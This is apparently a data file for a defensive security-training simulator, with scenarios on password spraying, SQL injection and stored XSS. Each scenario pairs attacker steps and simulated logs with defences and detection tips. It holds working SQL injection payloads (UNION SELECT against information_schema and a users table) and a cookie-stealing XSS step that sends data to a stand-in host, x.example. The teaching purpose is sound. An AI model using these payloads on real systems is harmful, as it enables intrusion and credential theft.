     facts: [["Downloaded", "3.1 GB"], ["Notable", "VPN accounts spreadsheet"], ["Next", "More targeted attacks"]],
     defender: "A full mailbox sync from a Tor exit is easy to alert on. Better still, an account with no MFA shouldn't exist to make it possible.",
     evidence: [{t: "10:53–11:40", src: "Microsoft 365 · unified audit log", title: "Full mailbox sync from a Tor exit: 3.1 GB", sev: "high", kind: "log",
       fields: [["Operation", "MailItemsAccessed (Sync)", "A mail client downloading whole folders"], ["Volume", "3.1 GB / 41,200 items", "The entire mailbox"], ["Client IP", "203.0.113.47", "A Tor exit node"]], raw: "Operation=MailItemsAccessed MailAccessType=Sync UserId=a.khan ClientIPAddress=203.0.113.47 folders=all items=41200"}]}
  ],
  defences: [
    {id: "smart", name: "Password-spray detection + automatic IP block", short: "Spray detection", at: 3, 
     desc: "Spots one source failing across many accounts and blocks it.",
     result: "After a few dozen failures across many accounts from one IP, identity protection raises a password-spray detection and an automated rule adds 203.0.113.47 to a blocked-locations conditional access policy. The rest of round one, and every later round, is refused.",
     ev: {t: "10:03:10", src: "Entra ID · identity protection", title: "Password spray detected: source IP blocked", sev: "block", kind: "log", fields: [["Detection", "Password spray", ""], ["Action", "Source IP added to a blocked named location", "Protects every account at once"]], raw: "riskEventType=passwordSpray ip=203.0.113.47 response=named_location_block"}},
    {id: "banned", name: "Banned password list", short: "Banned passwords", at: 5, 
     desc: "Rejects common and seasonal passwords when they're set.",
     result: "'Welcome1' and seasonal patterns like 'Winter2026!' were rejected whenever anyone tried to set them, so no account has one. Both spray rounds come up empty.",
     ev: {t: "10:51:44", src: "Entra ID · sign-in logs", title: "Round two: 237 failures, 0 successes", sev: "block", kind: "log", fields: [["Successes", "0", "No account uses a common password"]], raw: "ip=203.0.113.47 resultType=50126 distinctUsers=237 successes=0"}},
    {id: "mfaall", name: "MFA for every account (no forgotten exclusions)", short: "No MFA gaps", at: 5, 
     desc: "Old exclusions are reviewed and removed; shared mailboxes can't sign in.",
     result: "Last quarter's access review removed the scanner's MFA exclusion and turned a.khan into a shared mailbox with sign-in disabled. The correct password gets the attacker nothing, and every other account demands MFA.",
     ev: {t: "10:51:44", src: "Entra ID · sign-in logs", title: "Blocked: sign-in disabled for shared mailbox a.khan", sev: "block", kind: "log", fields: [["Account", "a.khan (shared mailbox)", "Nobody signs in to this directly"], ["Result", "Failure: account is disabled", "Error 50057"]], raw: "user=a.khan ip=203.0.113.47 status.errorCode=50057 result=failure"}}
  ],
  debrief: {
    detect: ["Many distinct users failing once each from one IP", "Bursts separated by quiet periods", "A success from an IP with hundreds of failures", "Single-factor sign-ins and full mailbox syncs from odd IPs"],
    prevent: ["Spray detection / smart lockout", "Banned password lists", "MFA for every account, with no forgotten exclusions", "Disable sign-in on shared mailboxes"]
  }
},

/* ============ 4. SQL INJECTION ============ */
{
  id: "sqli", cat: "web", name: "SQL injection", sub: "From a single quote to the admin panel",
  severity: "Critical",
  mitre: ["T1595.002 Vulnerability Scanning", "T1190 Exploit Public-Facing Application", "T1213.006 Data from Information Repositories: Databases", "T1110.002 Password Cracking", "T1078 Valid Accounts"],
  summary: "A shop's product page builds its database query by pasting in whatever is in the URL. The attacker uses that to make the database run their own SQL, dumps the users table, cracks the weak password hashes offline and logs in as admin.",
  facts: [["Root cause", "User input concatenated into SQL"], ["Fix", "Parameterised queries"], ["Backstops", "WAF, least privilege, strong hashing"], ["Classic tell", "UNION SELECT in the web logs"]],
  nodes: [
    {id: "atk", kind: "attacker", label: "Attacker", sub: "198.51.100.23", x: 140, y: 320},
    {id: "web", kind: "web", label: "shop.example", sub: "Web server / PHP app", x: 500, y: 320},
    {id: "db", kind: "db", label: "Shop database", sub: "MySQL · app account: web_app", x: 860, y: 320}
  ],
  links: [["atk", "web"], ["web", "db"]],
  lanes: ["atk", "web", "db"],
  steps: [
    {title: "Probe with a single quote", sub: "Does the app trust my input?", ph: 1, tactic: "Reconnaissance (T1595.002)",
     text: "The attacker adds a single quote to the product ID: /products.php?id=7'. The app pastes it straight into its SQL, which breaks the query, and the error page leaks the database's own message.",
     msgs: [{from: "atk", to: "web", label: "GET /products.php?id=7'", kind: "attack"}, {from: "web", to: "db", label: "…WHERE id = 7'", kind: "attack"}, {from: "db", to: "web", label: "Syntax error", kind: "normal"}, {from: "web", to: "atk", label: "500: SQL syntax error near '''", kind: "data"}],
     facts: [["Input", "id=7'"], ["Response", "500 + SQL error text"], ["Leaks", "Database type and query shape"]],
     defender: "A 500 error containing SQL syntax text in the app log is a red flag. Error pages should never show database messages.",
     evidence: [{t: "14:02:11", src: "Web server · access log", title: "GET /products.php?id=7' → 500", sev: "med", kind: "log",
       fields: [["Request", "GET /products.php?id=7%27", "%27 is an encoded single quote"], ["Status", "500", "The server broke, because the quote changed the SQL"], ["Client", "198.51.100.23", ""]],
       raw: "198.51.100.23 - - [19/Nov/2026:14:02:11 +0000] \"GET /products.php?id=7%27 HTTP/1.1\" 500 1874"}]},
    {title: "Confirm it's injectable", sub: "True vs false conditions", ph: 1, tactic: "Reconnaissance",
     text: "id=7 AND 1=1 shows the product, and id=7 AND 1=2 shows nothing. The attacker can now change the query's logic at will.",
     msgs: [{from: "atk", to: "web", label: "id=7 AND 1=1 / AND 1=2", kind: "attack"}, {from: "web", to: "atk", label: "Page / empty page", kind: "data"}],
     facts: [["AND 1=1", "Product shown"], ["AND 1=2", "Nothing shown"], ["Conclusion", "Injectable"]],
     defender: "The same URL repeated with AND 1=1 / AND 1=2 and different response sizes is the classic boolean test.",
     evidence: [{t: "14:02:40", src: "Web server · access log", title: "Boolean test pair: same page, two response sizes", sev: "med", kind: "log",
       fields: [["Request 1", "id=7%20AND%201=1 → 200, 8,102 bytes", "Condition true, page normal"], ["Request 2", "id=7%20AND%201=2 → 200, 1,206 bytes", "Condition false, page empty"]],
       raw: "\"GET /products.php?id=7%20AND%201=1\" 200 8102\n\"GET /products.php?id=7%20AND%201=2\" 200 1206"}]},
    {title: "Map the database", sub: "UNION SELECT the table names", ph: 2, tactic: "Initial access (T1190)",
     text: "Using UNION SELECT, the attacker appends their own query to the app's, asking the database to list its tables. The product page now shows table names instead of products: users, orders, payments…",
     msgs: [{from: "atk", to: "web", label: "UNION SELECT table_name …", kind: "attack"}, {from: "web", to: "db", label: "App query + attacker's query", kind: "attack"}, {from: "db", to: "web", label: "users, orders, payments…", kind: "data"}, {from: "web", to: "atk", label: "Table list on the page", kind: "data"}],
     facts: [["Technique", "UNION-based injection"], ["Found", "users, orders, payments"], ["Access level", "Whatever web_app can read"]],
     defender: "UNION SELECT and information_schema in a URL are unmistakable. A WAF or IDS signature catches this instantly.",
     evidence: [{t: "14:04:05", src: "Web server · access log", title: "UNION SELECT … information_schema in a product URL", sev: "high", kind: "log",
       fields: [["Request", "id=-1 UNION SELECT table_name,2,3 FROM information_schema.tables", "The attacker's own SQL appended to the app's"], ["Status", "200", "It worked"]],
       raw: "\"GET /products.php?id=-1%20UNION%20SELECT%20table_name,2,3%20FROM%20information_schema.tables\" 200 5530"}]},
    {title: "Dump the users table", sub: "48 KB of usernames and hashes", ph: 6, tactic: "Collection (T1213.006)",
     text: "Next the attacker pulls usernames and password hashes from the users table. The response is 48 KB where a product page is about 8 KB.",
     msgs: [{from: "atk", to: "web", label: "UNION SELECT username, password_hash …", kind: "attack"}, {from: "web", to: "db", label: "SELECT on users", kind: "attack"}, {from: "db", to: "web", label: "4,812 rows", kind: "data"}, {from: "web", to: "atk", label: "48 KB of hashes", kind: "data"}],
     compromise: ["db"], callout: "Users table stolen",
     facts: [["Rows", "4,812"], ["Hash type", "Unsalted MD5"], ["Response size", "48 KB (normal ≈ 8 KB)"]],
     defender: "A 200 response six times bigger than normal, plus the app account reading the users table, means data left the building.",
     evidence: [
      {t: "14:06:52", src: "Web server · access log", title: "200 response of 48 KB on a product URL (normally ~8 KB)", sev: "high", kind: "log",
       fields: [["Request", "id=-1 UNION SELECT username,password_hash,3 FROM users", ""], ["Bytes", "48,213", "About 6× a normal product page. Data was dumped"]], raw: "\"GET /products.php?id=-1%20UNION%20SELECT%20username,password_hash,3%20FROM%20users\" 200 48213"},
      {t: "14:06:52", src: "Database · audit log", title: "web_app read 4,812 rows from users", sev: "high", kind: "log",
       fields: [["Account", "web_app", "The shop's own database account"], ["Object", "users", "The product page has no business reading this table"], ["Rows", "4,812", "All of them"]], raw: "user=web_app@10.0.2.15 query=SELECT table=users rows=4812"}]},
    {title: "Crack the hashes offline", sub: "Unsalted MD5 falls fast", ph: 4, tactic: "Credential access (T1110.002)",
     text: "On a gaming GPU at home, the attacker cracks 70% of the unsalted MD5 hashes in under an hour, including the admin's 'Shop2024!'.",
     msgs: [], focus: ["atk"], callout: "Offline: 70% cracked",
     facts: [["Cracked", "70% in < 1 hour"], ["Includes", "admin"], ["Why so fast", "Fast hash, no salt"]],
     defender: "This happens offline, so you'll never see it. The only defence is to store passwords so they're too slow to crack.", evidence: []},
    {title: "Log in as admin", sub: "Front door, real password", ph: 5, tactic: "Privilege escalation (T1078)",
     text: "The attacker logs in to /admin with the cracked password, getting full control of products, prices and customer orders.",
     msgs: [{from: "atk", to: "web", label: "POST /admin/login (admin)", kind: "attack"}, {from: "web", to: "atk", label: "Admin dashboard", kind: "data"}],
     compromise: ["web"], callout: "Admin access",
     facts: [["Account", "admin"], ["MFA", "None"], ["Impact", "Full shop control"]],
     defender: "An admin login from the same IP that was injecting SQL minutes earlier needs no further explanation.",
     evidence: [{t: "15:12:30", src: "Application · auth log", title: "Admin login success from 198.51.100.23", sev: "high", kind: "log",
       fields: [["User", "admin", ""], ["IP", "198.51.100.23", "The same IP as the injection attempts"], ["MFA", "Not configured", ""]], raw: "event=login user=admin ip=198.51.100.23 result=success mfa=none"}]}
  ],
  defences: [
    {id: "param", name: "Parameterised queries (prepared statements)", short: "Parameterised", at: 1, 
     desc: "The ID is sent to the database as data, never as SQL.",
     result: "With a prepared statement, the quote is just part of the ID value. The database looks for a product whose ID is literally 7', finds none and returns 'Product not found'. There's no error and no foothold. This fixes the root cause.",
     ev: {t: "14:02:11", src: "Web server · access log", title: "GET /products.php?id=7' → 404 Product not found", sev: "block", kind: "log", fields: [["Status", "404", "Treated as data, not SQL"]], raw: "\"GET /products.php?id=7%27 HTTP/1.1\" 404 612"}},
    {id: "waf", name: "Web application firewall", short: "WAF", at: 3, 
     desc: "Blocks known injection patterns at layer 7.",
     result: "The WAF recognises UNION SELECT and information_schema and returns 403. That's a strong backstop, but WAFs can be bypassed, so the code still needs fixing.",
     ev: {t: "14:04:05", src: "WAF · event log", title: "Blocked: SQL injection (UNION-based)", sev: "block", kind: "log", fields: [["Rule", "SQLi: UNION SELECT / information_schema", ""], ["Action", "Block (403)", ""]], raw: "action=block rule=942100 msg=\"SQL Injection Attack Detected via libinjection\" uri=/products.php"}},
    {id: "leastpriv", name: "Least-privilege database account", short: "Least privilege", at: 4, 
     desc: "web_app can read products, not users.",
     result: "The injection still works, but web_app only has SELECT on the products and orders views. Reading the users table fails with 'permission denied', so the hashes stay put.",
     ev: {t: "14:06:52", src: "Database · audit log", title: "Denied: web_app SELECT on users", sev: "block", kind: "log", fields: [["Result", "Permission denied", "The app account can't touch the users table"]], raw: "user=web_app table=users result=ERROR 1142 SELECT command denied"}},
    {id: "bcrypt", name: "Salted, slow password hashing (bcrypt)", short: "bcrypt", at: 5, 
     desc: "Unique salts plus a deliberately slow algorithm.",
     result: "The hashes are stolen, but they're salted bcrypt. At a few thousand guesses a second per hash, strong passwords would take centuries, and the attacker gives up after recovering a handful of very weak ones (which you force-reset).",
     ev: {t: "—", src: "Incident notes", title: "Stolen hashes are bcrypt (cost 12): practical cracking infeasible", sev: "block", kind: "log", fields: [["Hash", "bcrypt, cost 12, per-user salt", ""]], raw: "$2b$12$Q9…(salted, slow)"}}
  ],
  debrief: {
    detect: ["500 errors with SQL text in the app logs", "Boolean pairs (AND 1=1 / AND 1=2)", "UNION SELECT / information_schema in URLs", "Oversized responses; app account reading tables it shouldn't"],
    prevent: ["Parameterised queries: the root-cause fix", "Least-privilege database accounts", "WAF as a backstop, not the fix", "Salted slow hashing; generic error pages; MFA on admin"]
  }
},

/* ============ 5. CROSS-SITE SCRIPTING ============ */
{
  id: "xss", cat: "web", name: "Stored XSS", sub: "A comment that steals the admin's session",
  severity: "High",
  mitre: ["T1059.007 JavaScript", "T1539 Steal Web Session Cookie", "T1550.004 Web Session Cookie"],
  summary: "A forum shows user comments without encoding them. The attacker posts a comment containing hidden JavaScript. When the forum admin opens the thread, their browser runs it as if it came from the forum, and it sends their session cookie to the attacker.",
  facts: [["Root cause", "Output not encoded"], ["Runs in", "The victim's browser"], ["Steals", "Session cookie"], ["Defences", "Encoding, HttpOnly, CSP"]],
  nodes: [
    {id: "atk", kind: "attacker", label: "Attacker", sub: "203.0.113.77", x: 140, y: 170},
    {id: "web", kind: "web", label: "forum.example", sub: "Web server", x: 500, y: 300},
    {id: "admin", kind: "laptop", label: "Forum admin's browser", sub: "logged in as admin", x: 860, y: 450},
    {id: "coll", kind: "web", hostile: true, label: "Attacker's server", sub: "x.example", x: 160, y: 480}
  ],
  links: [["atk", "web"], ["web", "admin"], ["admin", "coll"], ["coll", "atk"]],
  lanes: ["atk", "web", "admin", "coll"],
  steps: [
    {title: "Test the comment box", sub: "Is HTML rendered?", ph: 1, tactic: "Reconnaissance",
     text: "The attacker posts a harmless comment with a bold tag. It shows up in bold, which proves the forum renders HTML from users rather than displaying it as text.",
     msgs: [{from: "atk", to: "web", label: "Comment: <b>hello</b>", kind: "attack"}, {from: "web", to: "atk", label: "Shown in bold", kind: "data"}],
     facts: [["Test", "<b>hello</b>"], ["Result", "Rendered as bold"], ["Means", "No output encoding"]],
     defender: "A comment containing HTML tags is a weak signal on its own, but worth logging.",
     evidence: [{t: "16:20:03", src: "Application · content log", title: "Comment containing HTML tags posted", sev: "low", kind: "log",
       fields: [["Thread", "/thread/42", ""], ["Content", "<b>hello</b>", "HTML in a comment. The forum displays it unencoded"]], raw: "event=comment_create thread=42 user=newbie77 ip=203.0.113.77 html_tags=[b]"}]},
    {title: "Plant the script", sub: "A stored payload in thread 42", ph: 3, tactic: "Delivery: stored payload",
     text: "Now the comment includes a hidden script tag that, when a browser displays it, sends that browser's cookies to x.example. It's stored in the database and served to everyone who opens the thread.",
     msgs: [{from: "atk", to: "web", label: "Comment with hidden <script>", kind: "attack"}],
     facts: [["Type", "Stored (persistent) XSS"], ["Trigger", "Anyone viewing thread 42"], ["Target", "Session cookies"]],
     defender: "A script tag in submitted content (even URL-encoded) should be blocked or at least alerted on.",
     evidence: [{t: "16:22:41", src: "Web server · access log", title: "POST /comment containing an encoded script tag", sev: "high", kind: "log",
       fields: [["Request", "POST /comment (thread=42)", ""], ["Body contains", "%3Cscript%3E … document.cookie … x.example", "An encoded script that reads cookies and sends them to an outside domain"], ["Status", "201 Created", "Stored successfully"]], raw: "203.0.113.77 \"POST /comment HTTP/1.1\" 201 88 body=\"…%3Cscript%3E…document.cookie…x.example…%3C/script%3E…\""}]},
    {title: "The admin opens the thread", sub: "The browser trusts the forum", ph: 3, tactic: "Execution (T1059.007)",
     text: "The forum admin opens thread 42 to moderate it. Their browser receives the page, including the attacker's comment, and runs the script with the forum's full trust.",
     msgs: [{from: "admin", to: "web", label: "GET /thread/42", kind: "normal"}, {from: "web", to: "admin", label: "Page + attacker's comment", kind: "attack"}],
     facts: [["Who", "Logged-in admin"], ["Script runs as", "forum.example"], ["User sees", "Nothing unusual"]],
     defender: "Nothing stands out in a normal page view. The damage happens in the browser.", evidence: []},
    {title: "Cookie sent to the attacker", sub: "document.cookie leaves the building", ph: 4, tactic: "Credential access (T1539)",
     text: "The script reads document.cookie, which includes the admin's session cookie, and sends it to x.example as part of an image request.",
     msgs: [{from: "admin", to: "coll", label: "GET /c?s=<session cookie>", kind: "data"}, {from: "coll", to: "atk", label: "Admin session cookie", kind: "data"}],
     facts: [["Sent to", "x.example (registered yesterday)"], ["Contains", "Admin session cookie"], ["Visible to user", "No"]],
     defender: "Proxy or DNS logs show the admin's browser contacting a brand-new domain straight after loading thread 42.",
     evidence: [{t: "16:31:09", src: "Web proxy · log", title: "Admin's browser requested x.example/c?s=… (new domain)", sev: "high", kind: "log",
       fields: [["Client", "10.20.8.12 (forum admin)", ""], ["URL", "https://x.example/c?s=sess%3D9f2c…", "A session value in the query string"], ["Domain age", "1 day", "Newly registered"], ["Referrer", "https://forum.example/thread/42", "Triggered by the forum page"]], raw: "10.20.8.12 GET https://x.example/c?s=sess%3D9f2c… referer=https://forum.example/thread/42 category=newly_registered"}]},
    {title: "Session hijack", sub: "Admin panel, no password", ph: 2, tactic: "Session hijack (T1550.004)",
     text: "The attacker puts the cookie into their own browser and opens /admin. The forum sees a valid admin session and lets them straight in.",
     msgs: [{from: "atk", to: "web", label: "Cookie: session=… GET /admin", kind: "attack"}, {from: "web", to: "atk", label: "Admin panel", kind: "data"}],
     compromise: ["web"], callout: "Admin session hijacked",
     facts: [["Password needed", "No"], ["Session", "Admin's, reused"], ["Impact", "Full forum control"]],
     defender: "One session used from two IPs and two browsers at once is concurrent session usage. Bind sessions and alert on it.",
     evidence: [{t: "16:32:40", src: "Application · session log", title: "Admin session used from two IPs at once", sev: "high", kind: "log",
       fields: [["Session", "9f2c…", ""], ["IP 1", "10.20.8.12 (Chrome, Windows)", "The real admin"], ["IP 2", "203.0.113.77 (Firefox, Linux)", "The attacker, same session"]], raw: "session=9f2c… ips=[10.20.8.12,203.0.113.77] concurrent=true path=/admin"}]}
  ],
  defences: [
    {id: "encode", name: "Output encoding", short: "Encoding", at: 3, 
     desc: "Comments are HTML-encoded before display.",
     result: "The comment is HTML-encoded when the page is built, so the admin's browser displays the script as harmless text instead of running it. This is the root-cause fix.",
     ev: {t: "16:31:05", src: "Application · render", title: "Comment rendered as text (encoded)", sev: "block", kind: "log", fields: [["Rendered", "&lt;script&gt;…", "Shown as text, never executed"]], raw: "render thread=42 comment=1187 encoding=html"}},
    {id: "httponly", name: "HttpOnly session cookies", short: "HttpOnly", at: 4, 
     desc: "JavaScript can't read the session cookie.",
     result: "The script still runs, but the session cookie is marked HttpOnly, so document.cookie doesn't include it. The attacker receives an empty value and has nothing to replay.",
     ev: {t: "16:31:09", src: "Web proxy · log", title: "x.example received no session value", sev: "block", kind: "log", fields: [["URL", "https://x.example/c?s=", "Empty, because the cookie wasn't readable"]], raw: "10.20.8.12 GET https://x.example/c?s= (empty)"}},
    {id: "csp", name: "Content Security Policy", short: "CSP", at: 3, 
     desc: "Only approved scripts and destinations are allowed.",
     result: "The page's CSP bans inline scripts and connections to unapproved domains. The browser refuses to run the injected script and sends a CSP violation report, which doubles as your alert.",
     ev: {t: "16:31:05", src: "CSP report endpoint", title: "CSP violation: inline script blocked on /thread/42", sev: "block", kind: "log", fields: [["Directive", "script-src 'self'", "Inline script not allowed"], ["Page", "/thread/42", "Where the payload lives"]], raw: "{\"csp-report\":{\"document-uri\":\"https://forum.example/thread/42\",\"violated-directive\":\"script-src 'self'\",\"blocked-uri\":\"inline\"}}"}}
  ],
  debrief: {
    detect: ["HTML or script tags in submitted content", "Browsers calling new domains right after loading a page", "One session used from two IPs or browsers", "CSP violation reports"],
    prevent: ["Output encoding: the root-cause fix", "Input validation on the server", "HttpOnly + Secure cookies", "Content Security Policy"]
  }
}
]);
